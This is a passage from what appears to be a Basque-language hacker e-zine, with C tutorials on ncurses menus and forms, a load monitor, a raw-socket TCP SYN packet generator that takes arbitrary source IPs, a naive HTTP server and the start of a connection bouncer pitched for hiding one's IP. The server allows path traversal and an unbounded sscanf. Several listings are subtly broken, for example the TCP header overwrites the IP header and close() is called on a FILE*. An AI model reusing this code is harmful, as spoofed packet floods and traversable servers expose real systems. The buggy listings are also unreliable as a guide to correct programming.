	wbkgd(izenburu_leihoa, A_REVERSE | COLOR_PAIR(COLOR_YELLOW));

        // Kaxa bat: izenburu eta lerroekin
	box(izenburu_leihoa,ACS_VLINE,ACS_HLINE);
	wrefresh(izenburu_leihoa);

	for (i = 0; i < strlen(titulua); i++) {
		waddch(izenburu_leihoa, titulua[i] | A_BLINK);
	}

	mvwaddstr(izenburu_leihoa, 1,1," Edozein tekla sakatu jarraitzeko");

	wrefresh(izenburu_leihoa);

	getnstr(str, 20);
	refresh();

	// MENUAREN HASIERAKETA //
	for (i = 0; MENUA[i*2]; i++) {
		items[i] = new_item(MENUA[i*2], MENUA[(i*2)+1]);
	}
	items[i] = NULL;


	menu = new_menu(items);
	set_menu_win(menu,izenburu_leihoa);

	post_menu(menu);
	raw();
	noecho();	
	wrefresh(izenburu_leihoa);

	keypad(stdscr, TRUE);
	
        // quit = 1 izan arte ez gara aterako
	while(!quit) {
		int code;
		ITEM *selected;

                // teklatuan sartu dena jaso...
		key = getch();

                // eta erabaki bat hartzen dugu.
		switch(key) {

                        // gezia behera:
			case KEY_DOWN:
				code = menu_driver(menu, REQ_NEXT_ITEM);
				refresh();

				move(2,2);
				printw("Debug [down] %s    ",item_name(current_item(menu)));
  			        refresh();
				wrefresh(izenburu_leihoa);
				break;

                        // gezia gora:
			case KEY_UP:
				code = menu_driver(menu, REQ_PREV_ITEM);
				refresh();

				move(2,2);
				printw("Debug [up] %s    ",item_name(current_item(menu)));
				refresh();
				wrefresh(izenburu_leihoa);
				break;

                        // geziak bi aldetara: ezerrez
			case KEY_LEFT:
                                break;
			case KEY_RIGHT:
                                break;

                        // Enter sakatzean aukera egin da
			case '\n':
				if ((selected = current_item(menu)) != NULL) {
					unpost_menu(menu);
					refresh();
					wrefresh(izenburu_leihoa);
					mvaddstr(2,2,"Zure aukera da:    ");
					mvaddstr(3,3,item_description(selected));
					refresh();

                                        // Irtetzea eskatu bada...
					if (!strcmp("Irten",item_name(selected))) {
						quit = 1;
					} else  {
						post_menu(menu);
					}
					sleep(1);				
					post_menu(menu);
					refresh();
 				        wrefresh(izenburu_leihoa);
				}

                        // bestelako kasutan
			default:
				refresh();
			        wrefresh(izenburu_leihoa);
				break;			
		} // switch

	} // while


	delwin(izenburu_leihoa);
	endwin();
	exit(EXIT_SUCCESS);
}
--------------8<---------------------------------------------------------------


Formularioak
------------

Formularioak ezinbestekoak dira edozein programa serioan. Curses liburutegiak
egitura hau erabiltzeko aukera ematen digu, gainera datu moten kontrola sar daiteke.
Kasu xinple bat erakutsiko dugu.

--------------8<---------------------------------------------------------------
/**
* $Id$
* formularioa.c
* curses formularioa probatzeko programa - Espoz&Mina - Jakin ezine 7
* Konpilatzeko:
* gcc -o formularioa -lcurses -lform formularioa.c
*/

#include <stdlib.h>
#include <unistd.h>
#include <curses.h>
#include <errno.h>
#include <curses.h>
#include <form.h>

int main (int argc, char *argv[]) {

	// pantaila
	SCREEN *scr;

        // formularioa eta eremu aldagaiak
        FORM *formularioa;
        FIELD *eremuak[8];

        // 
        int atera = 0, gakoa, kodea;

	// Pantaila hasieratu
	if ((scr = newterm(NULL, stdout, stdin)) == NULL) {
		perror("Errorea newterm funtzioan");
		exit(EXIT_FAILURE);
	}

	if (set_term(scr) == NULL) {
		perror("Errorea set_term funtzioan");
		endwin();
		delscreen(scr);
		exit(EXIT_FAILURE);
	}

	refresh();

        // Eremu bat: Erabiltzaile izena
        // lerroa: 12 eta zutabea: 15
        eremuak[0] = new_field(1,10,12,15,0,0);
        field_opts_off(eremuak[0], O_AUTOSKIP);
	set_field_back(eremuak[0], A_UNDERLINE); 



        // Beste eremu bat: Erabiltzailearen pasahitza
        // lerroa: 14 eta zutabea: 15
        eremuak[1] = new_field(1,10,14,15,0,0);
        field_opts_off(eremuak[1], O_AUTOSKIP);
	set_field_back(eremuak[1], A_UNDERLINE); 


        // Hurrengo eremuari NULL esleitzen diogu
        eremuak[2] = NULL;

        // Formularioari eremuak esleitzen dizkiogu
        formularioa = new_form(eremuak);

	post_form(formularioa);
	refresh();
	
	mvprintw(1, 1, "Formulario proba ");
	mvprintw(12, 1, "Erabiltzailea:");
	mvprintw(14, 1, "Pasahitza:    ");
	refresh();




        raw();
        noecho();
        keypad(stdscr, TRUE); 

	refresh();

        // Teklatuan sartzen denaren zain...
        while((gakoa = getch()) != KEY_F(1)) {
            
           // Ea zer sartu den..
           switch (gakoa) {

              case KEY_UP:
                         kodea = form_driver(formularioa, REQ_PREV_FIELD);
			form_driver(formularioa, REQ_END_LINE);

                         break;
              case KEY_DOWN:
                         kodea = form_driver(formularioa, REQ_NEXT_FIELD);
 			form_driver(formularioa, REQ_END_LINE);
                         break;
              case '\t':
                         kodea = form_driver(formularioa, REQ_NEXT_FIELD);
                         break;

              case '\n':
                         if (field_index(current_field(formularioa)) == 1) {
                           atera = 1;
                         } else {
                           kodea = form_driver(formularioa, REQ_NEXT_FIELD);
                         }
                         break;
              default:
                         if (isprint(gakoa)) {
                           form_driver(formularioa, gakoa);
                         }
                         break;
           } // switch
                if (gakoa == 'q' || atera) {
                    break;
                }
           
	} // while
        

        // Orain, sartutako datuak pantailaratzen ditugu
	mvprintw(18, 1, "Sartutako erabiltzailea: %s",field_buffer(eremuak[0],0));
	mvprintw(20, 1, "Sartutako pasahitza: %s",field_buffer(eremuak[1],0));
	refresh();

	sleep(3);

	// Memoria garbitzen dugu...
	unpost_form(formularioa);
	free_form(formularioa);
	free_field(eremuak[0]);
	free_field(eremuak[1]); 

	endwin();
	delscreen(scr);

	exit(EXIT_SUCCESS);
}
------------8<-----------------------------------------------------------------


siskarga
--------

Orain ikus dezagun adibide praktiko bat. Sistemaren karga pantailaratzen duen
curses interfazea. Kodea oso xinplea da: proc fitxategietatik datuak atera
eta curses leihoan ateratzen ditu.

------------8<-----------------------------------------------------------------
/**
 * $Id: siskarga.c,v 1.1 2005/02/13 23:14:38 root Exp $
 * siskarga.c 
 * Sistemaren karga aztertzeko terminal programa
 * Espoz&Mina
 * konpilazioa:
 * gcc -o siskarga -lcurses siskarga.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <curses.h>

#define KARGA "/proc/loadavg"
#define REFRESH 3

// karga balioak array batean itzultzen ditu
int hartuKarga (void);

char karga_balioak[3][20];
int* prozesu_kopurua = 0;

// programa nagusia
int main (int argc, char *argv[], char *envp[])
{
	
	
	printf("siskarga v1.0 hasieratzen...\n");

	// sarrera karakterea
//	char sarrera = '';
	
	// pantaila
	SCREEN *scr;

	// leihoa:
	WINDOW *leihoa;

	/** Curses hasieraketa **/
	// Pantaila hasieratu
	if ((scr = newterm(NULL, stdout, stdin)) == NULL) {
		perror("Errorea newterm funtzioan");
		exit(EXIT_FAILURE);
	}

	if (set_term(scr) == NULL) {
		perror("Errorea set_term funtzioan");
		endwin();
		delscreen(scr);
		exit(EXIT_FAILURE);
	}
	/** curses hasieraketa prest **/

	// Leihoa margotzen dugu:
	if ( (leihoa = newwin(0,0,0,0)) == NULL ) {
		perror("Errorea leihoa sortzerakoan");
		exit(EXIT_FAILURE);
	}	
	
	box(leihoa, ACS_VLINE, ACS_HLINE);
	mvwaddstr(leihoa,0,2,"[Hauxe curses leihoa da]");
	mvwaddstr(leihoa ,LINES-1,COLS-20,"[SisKarga v1.0]");
	mvwhline(leihoa, 6, 1, ACS_HLINE, COLS-2);
	mvwhline(leihoa, LINES/2, 1, ACS_HLINE, COLS-2);
	wrefresh(leihoa);


	while(true) 
	{
		hartuKarga();

		wrefresh(leihoa);
		mvwprintw(leihoa, 2, 2,"Karga: %s ", karga_balioak[0]);
		mvwprintw(leihoa, 3, 2,"Karga: %s (5min)", karga_balioak[1]);
		mvwprintw(leihoa, 4, 2,"Karga: %s (15min)", karga_balioak[2]);
		mvwprintw(leihoa, 5, 2,"Prozesu Kop: %d ", prozesu_kopurua);
		wrefresh(leihoa);
		sleep(REFRESH);
	}
		
	// leihoa ezabatu eta ixten dugu
	delwin(leihoa);
	endwin();
	// pantaila ezabatzen dugu
	delscreen(scr);

	// bagoaz...
	printf("\n%d eta %d Siskarga by Espoz&Mina - Mila esker siskarga erabiltzeagatik\n", COLS, LINES);
	printf("\n%lf eta %d \n", karga_balioak[0], prozesu_kopurua);
	return(EXIT_SUCCESS);
}

/*
 * hartuKarga
 * /proc/loadavg fitxategiaren informazioa atera
 */

int hartuKarga (void) {
	FILE * fitx;

	if ( (fitx = fopen(KARGA,"r")) <  0) {
		perror("Errorea batazbesteko datuen fitxategia irekitzerakoan");
		printf("Programa itxi beharko da. Mezua: %d\n",strerror(errno));
		return -1;
	}

	fscanf(fitx,"%s %s %s %s %d", &karga_balioak[0], &karga_balioak[1], 
		&karga_balioak[2], &karga_balioak[3], &prozesu_kopurua);

	close(fitx);
	return 0;
}



------------8<-----------------------------------------------------------------

Tira. Nahikoa. Ncurses liburutegiaz gehiago ikasteko jo HOWTO ofizialera. Bertan adibideak
eta funtzioen erreferentzia egokia ematen da.

Hurrena artio!

return 0;

             -Espoz&Mina-

</0x04>




<0x05>
                       TCP/IP programazioa (VII)
                 _______________________________________



Gabon TCP/IP zaleok.
Gau honetan kode mordoa eta eremu ezberdinetakoa dakar Jakin-eko atal honek.
Zazpigarren aldiz zuekin.

Gaurkoan bi arlotan sartuko gara:
  1- Batetik TCP paketeen sorkuntza
  2- Bestetik bezero-zerbitzari erlazioa. HTTP zerbitzari xinple bat
  eta bouncer bat. Bouncer hitza "ponpakari" bezala itzuli dugu.
  Zer iruditzen zaizue? beste zerbait proposatu eh?



TCPsortzailea
-------------

Aurreko alean UDP datagrama sortzaile baten kodea erakutsi zen. Gaurko honetan
TCP pakete sortzaile bat izango da protagonista. Usnatzaileetarako libpcap daukagun
moduan, pakete sorgailuak garatzeko libnet liburutegia daukara eskuragarri.
Libnet liburutegiari buruzko laguntza behar baduzua beste ezine batzuen artikulu
hauetara jo dezakezue:
-PHRACK#55 : libnet liburutegiaren erreferentzia. (http://www.phrack.org/show.php?p=55&a=6)
-7a69ezine#12 : aurrekoaren itzulpena, erderaz.

Baina badakizue, Jakin-en estiloa gauzak errotik azaltzea da. Erosotasuna nahi izanez
gero hortxe dago libnet.

----------------------8<-----------------------------------------------------------
/**
* $Id$
* TCP pakete sortzailea, RAW socket_helbideak erabiliz.
* Jakin 7 - http://jakin.sf.net - by niuBAI
*
* erabilera: tcpsortzailea ip_jatorri portu_jatorri ip_helburu portu_helburu edukina
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define IPBERTSIOA 4   // ipv4 momentuz...
#define BIZIRAUPENA 60  // Time to Live balioa, bueltaka ez ibiltzeko
#define MEZULUZERA 12
#define ID 31337      // IP goiburuari jarriko diogun "marka" :)
#define TCP_LEHIOA 512
#define TCP_OFFSET 5

// goiburua egiaztatzeko funtzioa
unsigned short ip_egiaztapena(unsigned short *helbidea, int luzera);

/**
* programa nagusia
*/ 
int main (int argc, char *argv[], char *envp[]) 
{
	// Helbideak: jatorri eta helburu
	struct in_addr jatorri_helb;
	struct in_addr helburu_helb;

	// Portuak: jatorri eta helburu
	unsigned short jatorri_portua;
	unsigned short helburu_portua;

	// Socket definizioa
 	struct sockaddr_in socket_helbidea;

	// UDP goiburua
	struct tcphdr *tcpgoiburua;
	// IP goiburua
 	struct ip *ipgoiburua;
 
        // pakete sekuentzia zenbakia
        int sek_zenbakia = 10;
        // paketearen ACK balioa
        int ack_balioa = 11;

	// SORTUKO DUGUN PAKETEA: ip_goiburua + tcp_goiburua + datuak
  	unsigned char paketea[ sizeof(struct ip) + sizeof(struct tcphdr) + MEZULUZERA];
	
	// Mezua
	unsigned char mezua[MEZULUZERA];

	// Socket fitxategi deskribatzailea
	int socketa, aukerak = 1;

	// bidaliko ditugun paketeak
	int pakete_kopurua = 1, i = 0;

        // Agurra..
        printf("TCPsortzailea, tcp pakete sortzaile xinple bat. \nJakin ezine 7 -  by niuBAI \n");

	// Parametro kopuru desegokia pasatzen bada...
	if (argc < 6) {
            fprintf(stderr,"Erabilera: %s  ip_jatorri portu_jatorri ip_helburu portu_helburu \"edukina\" kopurua\n", argv[0]);
	    return(EXIT_FAILURE);
        }

	// Mezuaren luzera aztertzen dugu, meta gainezkadak sahiesteko strcpy-n
	if (strlen(argv[5]) > MEZULUZERA) {
		fprintf(stderr,"Errorea, mezua luzeegia da, kabroia\n");
		return(EXIT_FAILURE);
	}

	// Balioen esleipena //
	// jatorri helbidea
	jatorri_helb.s_addr = inet_addr(argv[1]);
	// jatorri portua
	jatorri_portua = (unsigned short)atoi(argv[2]);
	// helburu helbidea
	helburu_helb.s_addr = inet_addr(argv[3]);
	// helburu portua
	helburu_portua = (unsigned short)atoi(argv[4]);
	// mezua
	strcpy(mezua,argv[5]);
  	// pakete kopurua
	pakete_kopurua = atoi(argv[6]);

	// Socketa sortzen dugu orain: RAW motakoa!!
	if((socketa = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)  {
		printf("Errorea socket_helbidea sortzerakoan: %s\n", strerror(errno));
		return(EXIT_FAILURE);
	}
  
	// IP goiburua sartzeko agindua
	if(setsockopt(socketa,IPPROTO_IP,IP_HDRINCL,(char *)&aukerak,sizeof(aukerak)) < 0)  {
		printf("Errorea socket aukerak ezartzerakoan: %s\n", strerror(errno));
		return(EXIT_FAILURE);
	}
  
	/**** IP goiburua C programazioan : Jakin 3n azalduta ******
	struct ipheader {
	 unsigned char ip_hl:4, ip_v:4; // :4 honek esan nahi du bakoitza 4 biteko tam. duela 
	 unsigned char ip_tos;
	 unsigned short int ip_len;
	 unsigned short int ip_id;
	 unsigned short int ip_off;
	 unsigned char ip_ttl;
	 unsigned char ip_p;
	 unsigned short int ip_sum;
	 unsigned int ip_src;
	 unsinged int ip_dst;
	}; // ip goiburuaren luzera: 20 byte (=160 bit) */

	// IP paketea sortzen dugu, TCP motakoa kasu honetan
	ipgoiburua = (struct ip *)paketea;
	memset((char *)ipgoiburua,'\0',sizeof(struct ip));
	ipgoiburua->ip_id = htons(ID);
  	ipgoiburua->ip_hl = 5;
	ipgoiburua->ip_v = IPBERTSIOA;
	ipgoiburua->ip_ttl = BIZIRAUPENA;
	ipgoiburua->ip_p = IPPROTO_TCP;
  	ipgoiburua->ip_len = htons(sizeof(paketea));
	ipgoiburua->ip_src = jatorri_helb;
 	ipgoiburua->ip_dst = helburu_helb;
	// ip_sum: datuak ongi daudela argitzeko esleitzen den funtzioa
  	ipgoiburua->ip_sum = (unsigned short)ip_egiaztapena((unsigned short *)ipgoiburua,sizeof(struct ip));  

	// TCP goiburua prestatzen dugu
	tcpgoiburua = (struct tcphdr *)(paketea + sizeof(struct ip));
	printf("TCP goiburua sortuta. Goiburuaren tamaina: %d\n",sizeof( paketea + sizeof(struct ip) ));

	// Mezuaren edukina esleitzen diogu paketeari
	//memset((paketea+sizeof(struct udphdr)+sizeof(struct ip)),'0',MEZULUZERA);
	memcpy((paketea+sizeof(struct tcphdr)+sizeof(struct ip)), mezua, MEZULUZERA);


       /**** TCP goiburua C programazioan : Jakin 3n azalduta ******
       struct tcpheader {
        unsigned short int th_sport;
        unsigned short int th_dport;
        unsigned int th_seq;
        unsigned int th_ack;
        unsigned char th_x2:4, th_off:4;
        unsigned char th_flags;
        unsigned short int th_win;
        unsigned short int th_sum;
        unsigned short int th_urp;
       }; // TCP goiburuaren luzera: 20 byte (=160 bit) */

        // TCP goiburua prestatzen dugu 
        tcpgoiburua = (struct tcphdr *)paketea;
        memset((char *)tcpgoiburua,'\0',sizeof(struct tcphdr));
        tcpgoiburua->source = htons(jatorri_portua);
        tcpgoiburua->dest = htons(helburu_portua);
        tcpgoiburua->seq = htonl(sek_zenbakia);
        tcpgoiburua->ack_seq = htonl(ack_balioa);
        tcpgoiburua->doff = TCP_OFFSET;
        tcpgoiburua->res1 = 0;
        tcpgoiburua->window = htons(TCP_LEHIOA);
        tcpgoiburua->syn = 1;
        tcpgoiburua->ack = 0;

    	// Socket helbidea egitura hasieratu...
	memset(&socket_helbidea,'\0',sizeof(socket_helbidea));
  	// eta balioak esleitzen dizkiogu
	socket_helbidea.sin_family = AF_INET;
	socket_helbidea.sin_port = htons(helburu_portua);
	socket_helbidea.sin_addr = helburu_helb;
 
	// To paketeak!!
	for (i = 0; i < pakete_kopurua; i++) {
		printf("TCPa bidalitzen [tcp [%s:%s >> %s:%s]] ",argv[1],argv[2],argv[3],argv[4]);  

		if(sendto(socketa,&paketea,sizeof(paketea),0x0,(struct sockaddr *)&socket_helbidea,
	    		sizeof(socket_helbidea)) != sizeof(paketea))  {
			printf("Errorea tcp paketea bidaltzerakoan: %s\n", strerror(errno));
			perror("Errorea bidaltzerakoan");
			return(EXIT_FAILURE);
  		}

		printf(" %s--> Bidalita!! \n", mezua);  
	}

        return(EXIT_SUCCESS);
}

/**
 * ip_egiaztapena
 * IP goiburuentzako erabil daitekeen egiaztapen kodea.
 * erabilpena hautazkoa probak egiteko...
 */
unsigned short ip_egiaztapena(unsigned short *helbidea, int luzera) {
        
        register int batura = 0;
        u_short erantzuna = 0;
        register u_short *w = helbidea;

        // hasteko 16biteko hitz guztiak batutzen ditugu
        while (luzera > 1)  {
                batura = batura + *w++;
                luzera =  luzera - 2;
        }

        // carry bita baldinbadago, gehitu
        if (luzera == 1) {
                *(u_char *)(&erantzuna) = *(u_char *)w ;
                batura = batura + erantzuna;
        }

        // carrya gehitu berriz
        batura = (batura >> 16) + (batura & 0xffff);
        batura = batura + (batura >> 16);                    
        erantzuna = ~batura; 
                         
        return(erantzuna);
}

-------------------8<--------------------------------------------------------------


HTTPzerbitzaria v1
-------------------

Bueno, orain arte zertbitzari oso oso xinpleak, proof of concept izan dira,
oraingo honek edukina zerbitzatuko du bezeroak eskatutakoaren arabera.


----------------------8<-----------------------------------------------------------
/**
* $Id$
* httpzerbitzaria.c
* TCP zerbitzari baten funtzionamendua aztertzeko HTTP zerbitzari xinplea
*/

#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORTUA 31337
#define BUFFERMAX 256
#define ROOTDIR "/"
#define FITXATEGIMAX 50000

int tamaina;

// Bezero baten eskaerari erantzuna emateko prozedura
int erantzuna_eman (int bezero_soketa, struct sockaddr_in bezero_helbidea);

// Eskatutako fitxategia kargatzeko funtzioa GET eskaerari erantzuteko
char * irakur_fitxategia (char * fitxategia);

// at_exit funtzio bezala erregistratutko dugun funtzioa
void irteera_atazak (void);

// funtzio nagusia
int main (int argc, char *argv[]) {

        // Behar ditugun aldagaiak
        pid_t aita, semea;
        int zerbitzarisocket, sock_tmp;
        struct sockaddr_in zerbitzari_helb;
        struct sockaddr_in bezero_helb;
        int bezero_helb_tam;
        struct hostent *host_entitatea;
        int jasotakoa;
        int bidalitako_tamaina;
        int jasotako_tamaina;
        int portua = PORTUA; 
        char *rootdir = ROOTDIR;
        char c;
        char *bufferra;
        tamaina = FITXATEGIMAX;

	// ARGUMENTUEN TRATAMENDUA getopt funtzioarekin.
        // while + siwtch bat erabiltzen da normalean.
        // "d:p:t:" aukerazko argumentuak dira beraz deia holako zerbait izan daiteke
        // ./httpzerbitzaria -p 80 -d /root -t 100000
        // Aukerazko argumentu horiek flag hutsak ala baliodunak izan daitezke.
        // kasu honetan ez dira flag arruntak, balioa behar dute eta ":" jarri behar da getopt deian
        while ((c = getopt (argc, argv, "d:p:t:")) != -1) {
            switch (c) {
                case 'd':
	                 rootdir =(char *)malloc(strlen(optarg));
	                 strncpy(rootdir, optarg, strlen(optarg));
                         break;
                case 'p':
			 portua = (atoi(optarg) < 0 || atoi(optarg) > 65535)?PORTUA:atoi(optarg);
                         break;
                case 't':
			 tamaina = (atoi(optarg) < 0)?FITXATEGIMAX:atoi(optarg);
                         break;
                case '?':
                            printf("FLAG ezezaguna: -%c.\n", optopt);
                            printf("Aukerak: -p <portua> -d <rootdir> -t <tamaina>\n");
                            return 1;
                default:
                        abort ();
           } //switch-case
       }//while


        // Lehenbizi gurasotik ateratzen gara eta iratxoa sortzen dugu.
        if ((aita = fork()) < 0 ) {
                perror("Errorea prozesu berria sortzerakoan: ");
                exit(EXIT_FAILURE);
        }

        // aitan baldinbagaude, atera, semea uzten dugu.
        if (aita > 0) {
                exit(EXIT_FAILURE);
        }

        // LOGa prestatzen dugu. "tcpzerbitzaria" hitza identifikadorea izango da.
        openlog("httpzerbitzaria",LOG_PID, LOG_DAEMON);

        // Irteera funtzioa ezartzen dugu. Kodea amaitzean automatikoki deituko den funtzioa
        if (atexit(irteera_atazak) != 0) {
                perror("Errorea irteera funtzioa erregistratzerakoan.");
                syslog(LOG_ERR | LOG_USER, "Errorea irteera funtzioa erregistratzerakoan.");
                exit(EXIT_FAILURE);
        }

        // Semearen sesio propioa lortzen dugu.
        if ( ( semea = setsid()) < 0) {
                perror("Errorea prozesu sesio propioa eskatzerakoan.");
                syslog(LOG_ERR | LOG_USER, "Errorea prozesu sesio propioa eskatzerakoan.");
                exit(EXIT_FAILURE);
        }

        // Direktorioa aldatzen dugu
        if ( (chdir(rootdir)) < 0) {
                perror("Errorea / direktoriora aldatzerakoan.");
                syslog(LOG_ERR | LOG_USER, "Errorea / direktoriora aldatzerakoan.");
                exit(EXIT_FAILURE);
        }

        // fitxategi baimenak berreskuratzen ditugu.
        umask(0);
       
        printf("HTTPzerbitzaria by niuBAI - Jakin ezine 7 - nire prozesu IDa[%d]\n",getpid());
        printf("[rootdir: %s, portua: %d, fitxategi tamaina max: %d]\n", rootdir, portua, tamaina);

        // Oinarrizko fitxategi deskriptoreak ixten ditugu. 
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);

        syslog(LOG_ERR | LOG_USER, "OK, HTTP zerbitzaria martxan...");

        // Socketa sortzen dugu.
        if ((zerbitzarisocket = socket(AF_INET, SOCK_STREAM, 0) ) == -1 ) {
                syslog(LOG_ERR | LOG_USER, "Errorea socketa sortzerakoan: %s", strerror(errno));
                exit(EXIT_FAILURE);
        }

        // Socketaren helbide datuak ezarri (mota, portua, helbidea..)
        zerbitzari_helb.sin_family = AF_INET;
        zerbitzari_helb.sin_port = htons(portua);
        zerbitzari_helb.sin_addr.s_addr = htonl(INADDR_ANY);

        // Socketa bere helbideari
        if ( bind(zerbitzarisocket, (struct sockaddr*) &zerbitzari_helb, sizeof(struct sockaddr))  == -1 ) {
                syslog(LOG_ERR | LOG_USER, "Errorea socketa sortzerakoan: %s", strerror(errno));
                exit(EXIT_FAILURE);
        }

        // Socketa entzuten jartzen dugu.
        if ( listen(zerbitzarisocket, 10) == -1 ) {
                syslog(LOG_ERR | LOG_USER, "Errorea socketa listen moduan jartzerakoan %s", strerror(errno));
                exit(EXIT_FAILURE);
        }

        syslog(LOG_NOTICE | LOG_USER, "OK, tcpzerbitzaria %i portuan entzuten dago, eskaeren zain. ",PORTUA);


        // zerbitzariaren begizta nagusia
        while (1) {
                bezero_helb_tam = sizeof(struct sockaddr_in);

                // konexio bat onartzen dugu.
                        sock_tmp = accept(zerbitzarisocket, (struct sockaddr*) &bezero_helb, &bezero_helb_tam);

                // konexioan errorerik baldinbadago
                if ( sock_tmp == -1) {
                        syslog(LOG_ERR | LOG_USER, "Errorea konexioa onartzerakoan %s", strerror(errno));
                        exit(EXIT_FAILURE);
                }

                host_entitatea = gethostbyaddr((char *) &bezero_helb.sin_addr, sizeof(struct in_addr), AF_INET);

		erantzuna_eman(sock_tmp, bezero_helb);

                syslog(LOG_ERR | LOG_USER, "Segi aurrera\n");

        }


        exit(EXIT_SUCCESS);

}//amaiera

// Bezeroaren eskaerari erantzuna eman.
int erantzuna_eman(int bezero_soketa, struct sockaddr_in bezero_helb) {

     char bufferra[BUFFERMAX] = "+OK httpzerbitzaria, JaKiN ezine LABS\n";
     int byte_kopurua = 0;
     char urleskaera[BUFFERMAX];
     char *erantzuna;

     syslog(LOG_NOTICE | LOG_USER, "OK, konexio berria : %d",inet_ntoa((struct in_addr)bezero_helb.sin_addr ));

     // Bezeroaren eskaeraren zai geratzen gara.
     if ((byte_kopurua = recv(bezero_soketa, bufferra, BUFFERMAX-1, 0)) == -1) {
                syslog(LOG_ERR | LOG_USER, "Errorea socketan datuak jasotzerakoan %s", strerror(errno));
	        close(bezero_soketa);
                errno = 0;
     }

     // Honen bitartez bufferaren bukaera marka ezartzen da!!!
     bufferra[byte_kopurua] = '\0';

     // Eskaeratik interesatzen zaigun datua ateratzen dugu
     sscanf(bufferra,"GET /%s HTTP", &urleskaera);

     // Jaso den eskaera erakusten dugu
     syslog(LOG_USER, "Jasotakoa: %s eta eskaera: %s",bufferra, urleskaera);

     // Emaitza kargatzen dugu.
     erantzuna = irakur_fitxategia(urleskaera);

     // Erantzuna bidaltzen diogu
     if (send(bezero_soketa, erantzuna, strlen(erantzuna),0) == -1 ) {
            syslog(LOG_ERR | LOG_USER, "Errorea datuak bezeroari bidaltzerakoan %s", strerror(errno));
            errno = 0;
     }
      
     // malloc-eki Erreserbatutako memoria askatzen da.
     free(erantzuna);

     syslog(LOG_NOTICE | LOG_USER, "OK datuak bidalita: %s", bufferra);

     // Konexioa amaitutzat ematen dugu.
     close(bezero_soketa);

     return 0;
}

// Eskatutako fitxategia kargatzeko funtzioa GET eskaerari erantzuteko
char * irakur_fitxategia (char * fitxategizena) {
	FILE* fitxategia;
	char lerroa[255], *lerro;
	char *emaitza;

	emaitza = malloc((sizeof (char *)) * tamaina);
        //memset(&(emaitza), '\0', FITXATEGIMAX); // Gainontzeko egitura 0kin betetzen dugu

        syslog(LOG_USER, "Goazen irekitzera: %s",fitxategizena);

        // goazen fitxategia irekitzera...
	if ( (fitxategia = fopen(fitxategizena,"r")) == NULL)  {
		syslog(LOG_ERR | LOG_USER, "Errorea fitxategia irakitzerakoan: %s", strerror(errno));
	        strcpy(emaitza,"HTTP OK 200 \n\n <html><body>Fitxategia ez da existitzen</body></html>");
	} else {
		syslog(LOG_ERR | LOG_USER, "OK fitxategia ireki da: %s", fitxategizena);
                while (!feof(fitxategia)) {
                      lerro = fgets(lerroa,255,fitxategia);
                      strncat(emaitza, lerroa, 255);
                }

               fclose(fitxategia);	}


        return emaitza;
}

// programaren irteeran exekutatuko den funtzioa
void irteera_atazak(void) {
        // azken mezua pantailarat
        syslog(LOG_NOTICE | LOG_USER,"zerbitzaren exekuzioa gelditu da.");
        // log-a ixten dugu.
        closelog();
        exit(EXIT_SUCCESS);
}


-------------------8<--------------------------------------------------------------


Bueno. Modu hobeagoak daude zerbitzua emateko. Hurrengo aleetan prozesu eta hari
berriak erabiltzen dituen zerbitzaria egiten saiatuko naiz, eta pixkanaka geroz
eta zerbitzari profesionalagoa sortuko da.
Adi egon.


PONPAKARIA
----------

Bouncer = ponpakaria?

Zer da Bouncer bat?

Konexio bat berbideratzen duen zerbitzaria da. Bouncer bat martxan jartzen denean
zerbitzari bat dirudi portuak irekita uzten dituelako. Baina portu horietara konektatzen
zarenean beste zerbitzari batera bidaltzen zaitu.

Zertarako?
Oso baliogarria da NAT egiteko, baita gure benetako IPa izkutatzeko. IRC gerratan asko
erabiltzen den teknika da.

Kasu honetan ponpakari xinplea egin da. 6667 portura doazen eskaeran 80 portura bidaltzen dira.


Ze interes dauka programazio aldetik?
Konexioak bi norabidetan mantendu behar dira. Nolabait paketeak bidali edo jasotzerakoan
soketak ez dira blokeatu behar. Nola lortzen da hori? bota begirada.


----------------------8<-----------------------------------------------------------
/**
* $Id$
* ponpakaria.c
* PONPA: bouncer hitzaren itzulpena. Euskal pilota arloan "errebote" esaten da
* baina ponpakari hitza proposatuko nuke. Eritziak?
* Konpilazioa:
* gcc -o ponpakaria ponpakaria.c
* edo: make ponpakaria
* by niuBAI - Jakin ezine 7
*/

#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORTUA 6667
#define BUFFERMAX 256
#define ROOTDIR "/"
#define FITXATEGIMAX 50000

int tamaina;

// Benetako helburu zerbitzariarekin konektatuko den funtzioa
int helburuarekin_komunikatu(int bezero_soketa, struct sockaddr_in bezero_helbidea);

// Eskatutako fitxategia kargatzeko funtzioa GET eskaerari erantzuteko
char * irakur_fitxategia (char * fitxategia);

// funtzio nagusia
int main (int argc, char *argv[]) {

        // Behar ditugun aldagaiak
        pid_t aita, semea;
        int zerbitzarisocket, sock_tmp;
        struct sockaddr_in zerbitzari_helb;
        struct sockaddr_in bezero_helb;
        int bezero_helb_tam;
        struct hostent *host_entitatea;
        int jasotakoa;
        int bidalitako_tamaina;
        int jasotako_tamaina;
        int portua = PORTUA; 
        char *rootdir = ROOTDIR;
        char c;
        char *bufferra;
        tamaina = FITXATEGIMAX;

        // Lehenbizi gurasotik ateratzen gara eta iratxoa sortzen dugu.
        if ((aita = fork()) < 0 ) {
                perror("Errorea prozesu berria sortzerakoan: ");
                exit(EXIT_FAILURE);
        }

        // aitan baldinbagaude, atera, semea uzten dugu.
        if (aita > 0) {
                exit(EXIT_FAILURE);
        }

        // LOGa prestatzen dugu. "tcpzerbitzaria" hitza identifikadorea izango da.
        openlog("ponpakaria",LOG_PID, LOG_DAEMON);

        // Semearen sesio propioa lortzen dugu.
        if ( ( semea = setsid()) < 0) {
                perror("Errorea prozesu sesio propioa eskatzerakoan.");
